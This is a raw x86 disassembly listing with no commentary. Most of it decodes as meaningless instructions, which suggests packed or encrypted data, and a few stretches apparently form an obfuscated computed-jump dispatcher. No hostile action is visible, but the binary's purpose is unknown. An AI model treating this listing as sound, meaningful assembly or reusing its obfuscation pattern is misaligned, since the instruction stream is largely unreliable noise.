  40b1fb:	dec    edi
  40b1fc:	adc    al,0x87
  40b1fe:	xchg   edx,eax
  40b1ff:	adc    al,0x59
  40b201:	lea    eax,[ebx+0x31]
  40b204:	jne    0x40b276
  40b206:	push   ds
  40b207:	test   eax,0x43523a23
  40b20c:	mov    BYTE PTR [ecx+0x0],bh
  40b20f:	add    al,0xe5
  40b211:	push   edx
  40b212:	push   0x713cd915
  40b217:	adc    edx,DWORD PTR [esi]
  40b219:	in     al,dx
  40b21a:	xchg   edi,eax
  40b21b:	int3   
  40b21c:	jbe    0x40b217
  40b21e:	inc    eax
  40b21f:	pop    edi
  40b220:	js     0x40b269
  40b222:	mov    eax,0xccaef7f5
  40b227:	outs   dx,BYTE PTR ds:[esi]
  40b228:	lahf   
  40b229:	push   ebp
  40b22a:	in     al,dx
  40b22b:	scas   al,BYTE PTR es:[edi]
  40b22c:	dec    esp
  40b22d:	or     ebx,DWORD PTR [ebp+0x2b]
  40b230:	add    BYTE PTR [edi+0x15],dl
  40b233:	push   ecx
  40b234:	dec    ebp
  40b235:	add    BYTE PTR [ecx],0x4c
  40b238:	loope  0x40b25b
  40b23a:	lock scas al,BYTE PTR es:[edi]
  40b23c:	ret    
  40b23d:	loop   0x40b28d
  40b23f:	(bad)  
  40b240:	jae    0x40b1ee
  40b242:	sbb    al,0x17
  40b244:	dec    ecx
  40b245:	jo     0x40b260
  40b247:	mov    eax,0xb2c3f8f3
  40b24c:	fnstenv gs:[edx]
  40b24f:	xchg   ebx,eax
  40b250:	lea    ebp,[ebp+0x52]
  40b253:	inc    eax
  40b254:	push   ecx
  40b255:	dec    ebx
  40b256:	repnz pop ds
  40b258:	cmp    BYTE PTR [ecx],0x2d
  40b25b:	mov    bh,0x24
  40b25d:	push   0xa
  40b25f:	ficom  WORD PTR [esi]
  40b261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b262:	sahf   
  40b263:	or     BYTE PTR [ebx],cl
  40b265:	mov    dl,0xf8
  40b267:	xor    BYTE PTR [eax],ah
  40b269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b26a:	fimul  DWORD PTR [edi+0x7c]
  40b26d:	outs   dx,BYTE PTR ds:[esi]
  40b26e:	push   es
  40b26f:	fnstsw WORD PTR [edi]
  40b271:	ret    
  40b272:	aaa    
  40b273:	cmp    eax,esp
  40b275:	hlt    
  40b276:	test   eax,0xd4c94e5b
  40b27b:	cmp    dl,ch
  40b27d:	push   cs
  40b27e:	sbb    DWORD PTR [eax-0x4d],0x21
  40b282:	fisubr DWORD PTR [ecx+0x74526882]
  40b288:	dec    ecx
  40b289:	les    esi,FWORD PTR [esi+ebp*2-0x3f]
  40b28d:	jmp    0xc302:0xe2e3ae51
  40b294:	(bad)  
  40b295:	idiv   DWORD PTR ds:0x5de2f6c8
  40b29b:	xor    eax,DWORD PTR [eax-0x5dc24233]
  40b2a1:	or     BYTE PTR [ebp+0x45122b3e],0xae
  40b2a8:	inc    esp
  40b2a9:	enter  0xa93a,0x46
  40b2ad:	pop    ebx
  40b2ae:	and    DWORD PTR [eax-0x610c64bd],esi
  40b2b4:	mov    edi,0x75bc5463
  40b2b9:	inc    eax
  40b2ba:	xlat   BYTE PTR ds:[ebx]
  40b2bb:	bound  edi,QWORD PTR [ebx]
  40b2bd:	add    dl,BYTE PTR [ecx+0x2a]
  40b2c0:	xchg   ebp,eax
  40b2c1:	arpl   dx,sp
  40b2c3:	cdq    
  40b2c4:	mov    ecx,edx
  40b2c6:	loopne 0x40b24c
  40b2c8:	push   eax
  40b2c9:	push   edx
  40b2ca:	(bad)  
  40b2cb:	xor    esi,DWORD PTR [eax+0x5db80567]
  40b2d1:	aad    0x94
  40b2d3:	bound  ebp,QWORD PTR [bp+si]
  40b2d6:	nop
  40b2d7:	les    edx,FWORD PTR es:[ebx+esi*4-0x6007977f]
  40b2df:	dec    ebx
  40b2e0:	ins    BYTE PTR es:[edi],dx
  40b2e1:	or     al,0x22
  40b2e3:	xor    al,0x17
  40b2e5:	pop    ss
  40b2e6:	iret   
  40b2e7:	jp     0x40b30b
  40b2e9:	popf   
  40b2ea:	push   0x4c
  40b2ec:	mov    dl,0xab
  40b2ee:	out    0xc5,al
  40b2f0:	fdivr  st(2),st
  40b2f2:	(bad)  
  40b2f3:	(bad)
  40b2f6:	imul   edx,DWORD PTR [ebx+0x4b709e6b],0x5a
  40b2fd:	loop   0x40b32e
  40b2ff:	bnd je 0x40b31b
  40b302:	push   cs
  40b303:	cmp    eax,0xf2bf6ce
  40b308:	sbb    ebx,DWORD PTR ds:0x7d4958fe
  40b30e:	ins    DWORD PTR es:[edi],dx
  40b30f:	iret   
  40b310:	(bad)  
  40b311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b312:	pop    ds
  40b313:	xchg   edi,eax
  40b314:	(bad)  ds:0xc491d211
  40b31a:	adc    ah,dl
  40b31c:	fsubr  st,st(1)
  40b31e:	inc    edi
  40b31f:	loope  0x40b316
  40b321:	xchg   esp,eax
  40b322:	xchg   edx,eax
  40b323:	jmp    0x2fcaf9b6
  40b328:	jmp    0x91:0x5e91491b
  40b32f:	sti    
  40b330:	sti    
  40b331:	fbstp  TBYTE PTR [esi+0x59d035fb]
  40b337:	inc    ebx
  40b338:	jae    0x40b2e1
  40b33a:	cmp    eax,0xcd7085a6
  40b33f:	pop    ecx
  40b340:	ds out 0x4,eax
  40b343:	adc    bh,bl
  40b345:	outs   dx,BYTE PTR ds:[esi]
  40b346:	into   
  40b347:	outs   dx,DWORD PTR ds:[esi]
  40b348:	sbb    eax,edi
  40b34a:	pop    ebx
  40b34b:	sub    ah,dh
  40b34d:	sbb    eax,0x3cddee41
  40b352:	push   cs
  40b353:	pop    ecx
  40b354:	xor    al,0xb2
  40b356:	adc    DWORD PTR ds:0xf13512d0,0xffffff8e
  40b35d:	outs   dx,DWORD PTR ds:[esi]
  40b35e:	call   0x88c6:0x477586bb
  40b365:	mov    edi,0xa39c43fe
  40b36a:	fidivr WORD PTR [edi-0x23]
  40b36d:	mov    eax,ds:0x142712cc
  40b372:	add    ebp,DWORD PTR [eax+0xaeca105]
  40b378:	std    
  40b379:	daa    
  40b37a:	das    
  40b37b:	mov    dl,0x7
  40b37d:	xchg   BYTE PTR [edi-0x3a],bh
  40b380:	ret    
  40b381:	jne    0x40b3c6
  40b383:	neg    DWORD PTR [eax-0x3d4f8af4]
  40b389:	lds    ecx,FWORD PTR [ecx+0x75]
  40b38c:	pushf  
  40b38d:	retf   0xedbe
  40b390:	xchg   ebp,eax
  40b391:	scas   al,BYTE PTR es:[edi]
  40b392:	pop    edi
  40b393:	test   al,0x2d
  40b395:	xor    cl,BYTE PTR [edi]
  40b397:	inc    ebp
  40b398:	sahf   
  40b399:	pop    ebp
  40b39a:	out    dx,al
  40b39b:	add    edx,edi
  40b39d:	out    0x63,eax
  40b39f:	or     DWORD PTR [ecx+0x78d25d0],esi
  40b3a5:	aam    0x46
  40b3a7:	fcom   QWORD PTR [edx-0x76a51a1e]
  40b3ad:	xor    bl,dh
  40b3af:	sub    eax,0x478546fd
  40b3b4:	shr    DWORD PTR [ecx-0x6979d827],0x6
  40b3bb:	mov    esp,0xe998a7d3
  40b3c0:	add    eax,0x6faed88f
  40b3c5:	mov    al,ds:0xf66495f3
  40b3ca:	fiadd  DWORD PTR [eax+0x36]
  40b3cd:	jecxz  0x40b3e5
  40b3cf:	jmp    0x4139:0x5ca1e1b2
  40b3d6:	jp     0x40b42f
  40b3d8:	adc    DWORD PTR [eax+0x7d405d12],esp
  40b3de:	sahf   
  40b3df:	cmp    esp,DWORD PTR [edx+0x1]
  40b3e2:	int3   
  40b3e3:	mov    bl,0x7c
  40b3e5:	or     bh,bl
  40b3e7:	ins    BYTE PTR es:[edi],dx
  40b3e8:	jp     0x40b3fc
  40b3ea:	cmp    ebp,DWORD PTR ds:0x4d7e44d
  40b3f0:	test   eax,0xb4ae52ec
  40b3f5:	pop    ebx
  40b3f6:	nop
  40b3f7:	sti    
  40b3f8:	retf   
  40b3f9:	loopne 0x40b43c
  40b3fb:	fimul  DWORD PTR [ebx+0x77]
  40b3fe:	popf   
  40b3ff:	xchg   dh,bl
  40b401:	mov    al,ds:0x3a3e6381
  40b406:	mov    eax,ds:0xace42481
  40b40b:	push   0x2f17ec11
  40b410:	pop    edx
  40b411:	adc    al,0x30
  40b413:	mov    edx,0xc6e39c48
  40b418:	sar    BYTE PTR [ebx],cl
  40b41a:	push   esi
  40b41b:	ret    
  40b41c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b41d:	clc    
  40b41e:	add    al,0x96
  40b420:	ret    
  40b421:	mov    al,ds:0xcbde5ea3
  40b426:	mov    BYTE PTR [ebx-0x76a74aae],al
  40b42c:	in     eax,dx
  40b42d:	mov    dl,BYTE PTR [ecx+0x70f2d30f]
  40b433:	(bad)  
  40b434:	loop   0x40b457
  40b436:	pop    eax
  40b437:	dec    esi
  40b438:	cmp    al,0x51
  40b43a:	js     0x40b3c8
  40b43c:	popa   
  40b43d:	push   es
  40b43e:	sub    esi,DWORD PTR [ebp-0x3b]
  40b441:	cmp    al,0xe0
  40b443:	dec    edx
  40b444:	mov    ebp,0x697b0b75
  40b449:	sub    esp,DWORD PTR [edi-0x7b]
  40b44c:	push   ecx
  40b44d:	fwait
  40b44e:	shr    DWORD PTR [edx],1
  40b450:	xchg   esp,eax
  40b451:	lods   eax,DWORD PTR ds:[esi]
  40b452:	(bad)  
  40b453:	mov    edx,DWORD PTR [ebp+esi*1-0x5a]
  40b457:	sub    al,0x49
  40b459:	mov    dl,bl
  40b45b:	pop    ebx
  40b45c:	(bad)  
  40b45d:	fcmovb st,st(1)
  40b45f:	dec    esi
  40b460:	(bad)  
  40b461:	fnstcw WORD PTR [eax+esi*2-0xfcb62f1]
  40b468:	cmp    BYTE PTR [ecx],cl
  40b46a:	std    
  40b46b:	sub    al,0x44
  40b46d:	mov    al,0x8f
  40b46f:	repnz (bad) 
  40b471:	loopne 0x40b463
  40b473:	ret    0xe177
  40b476:	sbb    eax,0x91364a03
  40b47b:	cmp    al,0xbc
  40b47d:	mov    edx,DWORD PTR [esi+0x10e0ea67]
  40b483:	test   eax,0xb61e50b4
  40b488:	jo     0x40b470
  40b48a:	fstp   TBYTE PTR [esi-0x41]
  40b48d:	rcr    ebp,0xe8
  40b490:	mov    ebp,0x9d41cfeb
  40b495:	sahf   
  40b496:	push   edx
  40b497:	test   ah,bl
  40b499:	fidivr WORD PTR [edi-0x688b2449]
  40b49f:	add    BYTE PTR [eax-0x61],al
  40b4a2:	jmp    0x55c1:0x2cee43af
  40b4a9:	fiadd  WORD PTR [ebx]
  40b4ab:	stos   BYTE PTR es:[edi],al
  40b4ac:	jmp    0x40b4e8
  40b4ae:	mov    ebx,0x6eb919e3
  40b4b3:	mov    ebx,DWORD PTR [eax-0x29]
  40b4b6:	or     esi,edi
  40b4b8:	push   ecx
  40b4b9:	xchg   esp,eax
  40b4ba:	xchg   ebp,eax
  40b4bb:	stc    
  40b4bc:	lods   al,BYTE PTR ds:[esi]
  40b4bd:	pop    ecx
  40b4be:	adc    eax,0x72831966
  40b4c3:	mov    dh,0x1d
  40b4c5:	cmp    edx,DWORD PTR [ecx-0x36]
  40b4c8:	adc    ecx,DWORD PTR [edx]
  40b4ca:	in     eax,0xe7
  40b4cc:	xor    BYTE PTR [edx],0xde
  40b4cf:	fmul   st(6),st
  40b4d1:	mov    dl,0xbe
  40b4d3:	imul   edi,DWORD PTR [edx],0x3255fa50
  40b4d9:	sbb    BYTE PTR [eax-0x56],al
  40b4dc:	rcl    DWORD PTR [edi+ebp*4-0x6e683691],cl
  40b4e3:	adc    dl,0xcc
  40b4e6:	mov    BYTE PTR [ebx],dh
  40b4e8:	pop    es
  40b4e9:	imul   edi,DWORD PTR [ebp+0x5e],0xffffff86
  40b4ed:	push   ss
  40b4ee:	cld    
  40b4ef:	sub    DWORD PTR [edx+0x4466e211],edx
  40b4f5:	and    al,BYTE PTR [esi+0x63]
  40b4f8:	data16 jne 0x40b480
  40b4fb:	xchg   esi,eax
  40b4fc:	jecxz  0x40b4f7
  40b4fe:	and    eax,0xb4526be7
  40b503:	sbb    DWORD PTR [ebx],0x54
  40b506:	(bad)  
  40b507:	sbb    esp,edi
  40b509:	push   es
  40b50a:	or     eax,0xc4b2a73b
  40b50f:	mul    BYTE PTR [ebx-0x4c91430e]
  40b515:	shl    DWORD PTR [ecx-0x2],0x7e
  40b519:	lods   al,BYTE PTR ds:[esi]
  40b51a:	es dec esp
  40b51c:	mov    eax,ds:0xff58016
  40b521:	scas   eax,DWORD PTR es:[edi]
  40b522:	xlat   BYTE PTR ds:[ebx]
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	test   esi,ebx
  40b551:	add    eax,DWORD PTR [ebx-0x3f]
  40b554:	xchg   BYTE PTR [eax+0x70],dh
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b592
  40b55c:	mov    ecx,0x46f01ccf
  40b561:	and    dl,dl
  40b563:	cmp    al,0x6
  40b565:	adc    ch,al
  40b567:	sub    ebx,DWORD PTR [ebp+esi*4-0x60]
  40b56b:	inc    esi
  40b56c:	aad    0xf0
  40b56e:	or     BYTE PTR [esi-0x7e],ch
  40b571:	inc    edx
  40b572:	dec    eax
  40b573:	sbb    BYTE PTR [edx+0x34fb797b],dh
  40b579:	les    edx,FWORD PTR [esi-0x6eaa05b7]
  40b57f:	leave  
  40b580:	ret    0x4829
  40b583:	out    dx,eax
  40b584:	mov    BYTE PTR [ecx],bh
  40b586:	in     al,0x4b
  40b588:	xchg   ch,ch
  40b58a:	sub    al,0x7d
  40b58c:	loopne 0x40b5e4
  40b58e:	leave  
  40b58f:	sar    DWORD PTR [edx+edi*8],1
  40b592:	jecxz  0x40b5c3
  40b594:	call   0x5546dfd1
  40b599:	rcr    bl,0xd2
  40b59c:	cld    
  40b59d:	add    BYTE PTR [ecx],bh
  40b59f:	pop    esp
  40b5a0:	fimul  DWORD PTR [ebp+0x3d80de11]
  40b5a6:	cmp    dl,BYTE PTR [esp+edi*8-0x3]
  40b5aa:	mov    eax,ds:0x9e8f65b7
  40b5af:	xor    dl,bl
  40b5b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5b2:	aaa    
  40b5b3:	push   edi
  40b5b4:	cmp    edx,DWORD PTR [esi-0x3f]
  40b5b7:	shl    dl,0x3c
  40b5ba:	xchg   DWORD PTR [ebp-0xaa38fc3],ebx
  40b5c0:	xor    eax,0x45a13272
  40b5c5:	mov    DWORD PTR [eax],ebx
  40b5c7:	je     0x40b62d
  40b5c9:	add    al,0x39
  40b5cb:	es xor al,0x46
  40b5ce:	xchg   esp,eax
  40b5cf:	push   esi
  40b5d0:	cld    
  40b5d1:	jae    0x40b5b2
  40b5d3:	and    BYTE PTR [ebp+0x385b5128],bh
  40b5d9:	sar    DWORD PTR [eax],1
  40b5db:	(bad)  
  40b5dc:	std    
  40b5dd:	jle    0x40b56c
  40b5df:	stos   BYTE PTR es:[edi],al
  40b5e0:	xor    ebp,ebx
  40b5e2:	hlt    
  40b5e3:	in     eax,0x97
  40b5e5:	and    BYTE PTR [edx-0x9],0x89
  40b5e9:	xchg   esp,eax
  40b5ea:	aad    0x71
  40b5ec:	stc    
  40b5ed:	jmp    0xd537:0x36ef1664
  40b5f4:	shl    BYTE PTR es:[eax+0x8],0x27
  40b5f9:	pop    edi
  40b5fa:	cmp    bh,dh
  40b5fc:	jge    0x40b582
  40b5fe:	enter  0x95ed,0xaa
  40b602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b603:	push   ebp
  40b604:	mov    bh,0x42
  40b606:	pop    esi
  40b607:	xchg   esp,eax
  40b608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b609:	mov    bh,0xbd
  40b60b:	cwde   
  40b60c:	cmp    BYTE PTR [ecx+0x1a2d3acc],0x0
  40b613:	mov    dl,0xee
  40b615:	mov    ebp,0xf17e015f
  40b61a:	nop
  40b61b:	jge    0x40b5ea
  40b61d:	mov    al,0xea
  40b61f:	fisubr DWORD PTR [edx+0x693474c3]
  40b625:	add    BYTE PTR [ebx],bh
  40b627:	and    DWORD PTR [esi],ebx
  40b629:	das    
  40b62a:	and    BYTE PTR [eax-0x34],bl
  40b62d:	lods   al,BYTE PTR ds:[esi]
  40b62e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40b630:	adc    al,0x56
  40b632:	jmp    0x77526302
  40b637:	daa    
  40b638:	shl    BYTE PTR [ecx],1
  40b63a:	retf   
  40b63b:	ds dec ebx
  40b63d:	push   ebp
  40b63e:	xlat   BYTE PTR ds:[ebx]
  40b63f:	mov    ebp,0x8ddb9cdc
  40b644:	outs   dx,BYTE PTR ds:[esi]
  40b645:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b647:	clc    
  40b648:	add    BYTE PTR ss:[eax+eax*8-0x5dd0ea6b],0xbd
  40b651:	sub    edi,DWORD PTR [eax-0x2d5e04c9]
  40b657:	jbe    0x40b649
  40b659:	not    BYTE PTR [ebp-0xe]
  40b65c:	fadd   QWORD PTR [eax+0x1]
  40b65f:	adc    edx,ebp
  40b661:	in     eax,dx
  40b662:	call   0x4b93cca4
  40b667:	push   0x52
  40b669:	or     BYTE PTR [esi+0xf],bh
  40b66c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b66d:	mov    esp,DWORD PTR [ebx]
  40b66f:	mov    ch,0x4c
  40b671:	mov    edi,DWORD PTR [ebp-0x2cd42a92]
  40b677:	outs   dx,DWORD PTR ds:[esi]
  40b678:	sub    ebp,DWORD PTR [ebx+0x49]
  40b67b:	sahf   
  40b67c:	sub    eax,0xf2eeaf89
  40b681:	add    ebx,ebx
  40b683:	push   ss
  40b684:	push   ecx
  40b685:	aaa    
  40b686:	pop    edi
  40b687:	dec    ebp
  40b688:	or     eax,0xff7f82dc
  40b68d:	arpl   WORD PTR [ecx+ecx*4],di
  40b690:	std    
  40b691:	in     al,dx
  40b692:	rcl    DWORD PTR [ebp-0x4f09ff5f],cl
  40b698:	xchg   esi,eax
  40b699:	sti    
  40b69a:	(bad)  
  40b69c:	loopne 0x40b6c6
  40b69e:	inc    esi
  40b69f:	(bad)  
  40b6a0:	pop    ss
  40b6a1:	mov    bh,0x98
  40b6a3:	xor    ch,BYTE PTR [eax+0x68]
  40b6a6:	jl     0x40b663
  40b6a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6a9:	test   eax,0x276bb169
  40b6ae:	outs   dx,BYTE PTR ds:[esi]
  40b6af:	aam    0xcc
  40b6b1:	sbb    ah,BYTE PTR [edx]
  40b6b3:	lea    eax,[esi]
  40b6b5:	(bad)  
  40b6b6:	mov    dl,0xbb
  40b6b8:	shl    ebp,1
  40b6ba:	push   edx
  40b6bb:	xchg   esp,eax
  40b6bc:	sub    edi,ebp
  40b6be:	cmp    cl,al
  40b6c0:	sbb    eax,0x177e6871
  40b6c5:	inc    esi
  40b6c6:	xor    edx,ebx
  40b6c8:	shl    BYTE PTR [ecx],0x97
  40b6cb:	sahf   
  40b6cc:	sbb    BYTE PTR [eax+ebx*1+0x4f],dl
  40b6d0:	imul   eax,DWORD PTR [edx-0x7a590041],0xffffff98
  40b6d7:	xchg   edi,eax
  40b6d8:	add    eax,0x41faf617
  40b6dd:	je     0x40b738
  40b6df:	lds    ecx,FWORD PTR [ebx-0x6b]
  40b6e2:	mov    cl,0x6c
  40b6e4:	retf   
  40b6e5:	loopne 0x40b766
  40b6e7:	test   DWORD PTR [esi],ebx
  40b6e9:	or     eax,0x5393b8ac
  40b6ee:	xchg   ebx,eax
  40b6ef:	inc    esi
  40b6f0:	scas   al,BYTE PTR es:[edi]
  40b6f1:	outs   dx,BYTE PTR ds:[esi]
  40b6f2:	mov    fs,WORD PTR [ecx+0x7a]
  40b6f5:	or     al,0xa1
  40b6f7:	xchg   ebp,eax
  40b6f8:	test   DWORD PTR [edx*8+0x103e96d4],0xf5521acd
  40b703:	pop    eax
  40b704:	(bad)  
  40b705:	shl    ah,cl
  40b707:	leave  
  40b708:	int3   
  40b709:	jbe    0x40b743
  40b70b:	pop    ss
  40b70c:	mov    ds:0x85ad7963,al
  40b711:	xor    BYTE PTR [ebx],al
  40b713:	add    DWORD PTR [edi],edx
  40b715:	or     DWORD PTR [eax],edi
  40b717:	popf   
  40b718:	std    
  40b719:	adc    al,0x32
  40b71b:	aad    0xd6
  40b71d:	mov    edi,0xfb2a42ef
  40b722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b723:	push   ecx
  40b724:	jnp    0x40b6df
  40b726:	data16 lods al,BYTE PTR ds:[esi]
  40b728:	sti    
  40b729:	adc    eax,0x810c23
  40b72e:	out    0x8f,eax
  40b730:	stos   BYTE PTR es:[edi],al
  40b731:	adc    al,0xbe
  40b733:	in     al,0xb2
  40b735:	or     DWORD PTR [ebp+0x4a0defbd],ecx
  40b73b:	mov    edi,0xc0e60149
  40b740:	(bad)  
  40b741:	enter  0xc72e,0xa8
  40b745:	lods   eax,DWORD PTR ds:[esi]
  40b746:	ret    0x6357
  40b749:	hlt    
  40b74a:	jecxz  0x40b712
  40b74c:	shr    DWORD PTR [ebx],cl
  40b74e:	(bad)
  40b751:	bound  ecx,QWORD PTR [ebp-0x1d6cab4b]
  40b757:	aam    0x29
  40b759:	fcmovnu st,st(0)
  40b75b:	adc    al,0xe
  40b75d:	sub    DWORD PTR [ebx-0x23],edi
  40b760:	xor    DWORD PTR [esp+edi*8+0x12a3140f],ebp
  40b767:	jae    0x40b780
  40b769:	jmp    0x40b711
  40b76b:	nop
  40b76c:	pop    ds
  40b76d:	add    ebx,esi
  40b76f:	ins    DWORD PTR es:[edi],dx
  40b770:	(bad)  
  40b771:	fisubr DWORD PTR [ebx+0x61]
  40b774:	stos   BYTE PTR es:[edi],al
  40b775:	jle    0x40b71a
  40b777:	sbb    eax,0xc5d319e4
  40b77c:	push   0xffffffa6
  40b77e:	jno    0x40b7d2
  40b780:	arpl   WORD PTR [edi+0x4e6a3c28],cx
  40b786:	add    DWORD PTR [eax],edi
  40b788:	(bad)  
  40b789:	xchg   edi,eax
  40b78a:	enter  0x608b,0xdf
  40b78e:	lds    ebx,FWORD PTR [ecx+0x3b]
  40b791:	retf   0x60c
  40b794:	jns    0x40b75f
  40b796:	xor    DWORD PTR [edx],esp
  40b798:	xor    DWORD PTR [ebx],esp
  40b79a:	dec    ebp
  40b79b:	pop    esp
  40b79c:	push   esp
  40b79d:	mov    ecx,0xf719bd38
  40b7a2:	jge    0x40b771
  40b7a4:	or     eax,0x40d004b2
  40b7a9:	xlat   BYTE PTR ds:[ebx]
  40b7aa:	push   eax
  40b7ab:	(bad)  
  40b7ac:	xchg   ebx,eax
  40b7ad:	(bad)  
  40b7ae:	adc    al,0x20
  40b7b0:	imul   esp,DWORD PTR [eax-0x716dec85],0xffffffb2
  40b7b7:	pop    edx
  40b7b8:	pop    edi
  40b7b9:	lods   al,BYTE PTR ds:[esi]
  40b7ba:	pop    es
  40b7bb:	lahf   
  40b7bc:	xor    bh,cl
  40b7be:	fdivr  QWORD PTR [edx+0x1fed3c3a]
  40b7c4:	xor    BYTE PTR [edi+0x63f69cb3],al
  40b7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7cb:	in     al,dx
  40b7cc:	out    dx,al
  40b7cd:	inc    ebp
  40b7ce:	sub    al,0x94
  40b7d0:	ret    
  40b7d1:	xor    al,0xfd
  40b7d4:	inc    ebx
  40b7d5:	in     eax,dx
  40b7d6:	(bad)  
  40b7d7:	shr    ebx,cl
  40b7d9:	aad    0x68
  40b7db:	xchg   esp,eax
  40b7dc:	push   ecx
  40b7dd:	jae    0x40b796
  40b7df:	jp     0x40b85e
  40b7e1:	test   al,0x6d
  40b7e3:	jmp    DWORD PTR ss:[edi]
  40b7e6:	fist   WORD PTR es:[ecx-0x5a]
  40b7ea:	jno    0x40b7e1
  40b7ec:	push   edi
  40b7ed:	add    bl,BYTE PTR [ecx-0x5e]
  40b7f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7f1:	enter  0x3d8,0x47
  40b7f5:	cmp    BYTE PTR [edx-0x396dcbd5],bh
  40b7fb:	(bad)  [ebx+0x2cf5971f]
  40b801:	mov    bl,cl
  40b803:	fdiv   st(4),st
  40b805:	xchg   BYTE PTR [ecx],al
  40b807:	push   esp
  40b808:	xor    eax,0x4ff3ac74
  40b80d:	addr16 inc eax
  40b80f:	xlat   BYTE PTR ds:[ebx]
  40b810:	jp     0x40b7a3
  40b812:	sbb    eax,0x14a072b8
  40b817:	dec    esp
  40b818:	or     dh,BYTE PTR [edi*8+0x42fd606]
  40b81f:	adc    DWORD PTR [esi],ecx
  40b821:	sbb    al,0xb6
  40b823:	(bad)  
  40b824:	pop    edi
  40b825:	pop    edx
  40b826:	xor    al,0x98
  40b828:	push   es
  40b829:	dec    esi
  40b82a:	mov    esp,0xc9aa5ab2
  40b82f:	mov    ecx,0x7dc0bf74
  40b834:	mov    dh,dh
  40b836:	stos   DWORD PTR es:[edi],eax
  40b837:	add    al,0x72
  40b839:	mov    ebx,0xa59ca01e
  40b83e:	adc    DWORD PTR [edi+eiz*8+0x3c],ecx
  40b842:	mov    ds:0x1201ef83,al
  40b847:	lods   al,BYTE PTR ds:[esi]
  40b848:	fld    DWORD PTR [eax-0x29]
  40b84b:	mov    bl,0x76
  40b84d:	cs dec esp
  40b84f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b850:	mov    ebp,0x7a93d32d
  40b855:	jno    0x40b7e1
  40b857:	div    DWORD PTR [esi+ecx*4-0x5c670f98]
  40b85e:	ja     0x40b8b2
  40b860:	sub    DWORD PTR [ebx+eax*8+0x36],esp
  40b864:	mov    eax,0x284beb22
  40b869:	push   edi
  40b86a:	jp     0x40b8a3
  40b86c:	pop    esi
  40b86d:	inc    eax
  40b86e:	xor    ebp,DWORD PTR [ebp+0x69edcf19]
  40b874:	mov    ebp,0x955b03b0
  40b879:	mov    dl,0x22
  40b87b:	ficomp WORD PTR [ebx]
  40b87d:	push   ebp
  40b87e:	popf   
  40b87f:	lds    eax,FWORD PTR [edx]
  40b881:	ds popa 
  40b883:	mov    cl,0x5f
  40b885:	xor    cl,BYTE PTR [eax-0x10]
  40b888:	shr    bh,cl
  40b88a:	dec    ebx
  40b88b:	sbb    eax,0x25edad71
  40b890:	adc    esp,edx
  40b892:	mov    al,ds:0x2f5b567
  40b897:	ss jno 0x40b90e
  40b89a:	xor    BYTE PTR [ecx+0x6cd0da8e],ch
  40b8a0:	inc    edi
  40b8a1:	int    0xc
  40b8a3:	inc    ebx
  40b8a4:	mov    ds:0x651c1e7a,eax
  40b8a9:	imul   ebx,DWORD PTR [ebp-0x42],0xffffff83
  40b8ad:	dec    edx
  40b8ae:	fistp  QWORD PTR [ebp+ebp*1+0x2]
  40b8b2:	dec    eax
  40b8b3:	imul   ebx,DWORD PTR [edi-0x705a660],0x4105a8ba
  40b8bd:	pushf  
  40b8be:	sbb    al,0xb0
  40b8c0:	mov    bh,0xa9
  40b8c2:	outs   dx,DWORD PTR ds:[esi]
  40b8c3:	rol    BYTE PTR [ecx+ebp*8-0x61],0x4d
  40b8c8:	inc    edx
  40b8c9:	push   0xffffff82
  40b8cb:	movlps QWORD PTR [eax+ecx*2-0x59],xmm6
  40b8d0:	inc    esp
  40b8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8d2:	mov    ss,WORD PTR [ebx-0x4a3ba5ba]
  40b8d8:	aam    0x8e
  40b8da:	sub    esi,DWORD PTR [esi-0x21]
  40b8dd:	loopne 0x40b89a
  40b8df:	adc    DWORD PTR [esi+0x44],0xffffff81
  40b8e3:	or     bl,BYTE PTR [eax-0x56]
  40b8e6:	cmp    eax,0x26ea3736
  40b8eb:	outs   dx,BYTE PTR ds:[esi]
  40b8ec:	xchg   ebp,eax
  40b8ed:	out    dx,al
  40b8ee:	xor    al,0xea
  40b8f0:	xchg   DWORD PTR [eax+0x67],edi
  40b8f3:	sub    ch,BYTE PTR [ebx]
  40b8f5:	in     eax,0x2a
  40b8f7:	repnz es nop
  40b8fa:	scas   al,BYTE PTR es:[edi]
  40b8fb:	aad    0x8b
  40b8fd:	jge    0x40b8fb
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
